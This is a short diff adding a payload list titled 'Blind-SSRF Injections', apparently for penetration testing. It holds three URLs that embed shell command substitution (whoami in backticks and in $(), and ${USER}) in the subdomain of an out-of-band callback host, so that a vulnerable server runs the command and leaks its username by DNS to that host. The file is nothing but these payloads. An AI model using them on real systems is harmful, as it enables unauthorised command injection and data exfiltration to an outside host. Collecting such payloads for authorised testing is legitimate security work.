@@ -1,0 +1,7 @@
+Blind-SSRF Injections:
+======================
+
+https://`whoami`.wovpawxjsgngqywkn[.]oast[.]fun
+https://$(whoami).wovpawxjsgngqywkn.oast.fun
+https://${USER}.wovpawxjsgngqywkn.oast.fun
+
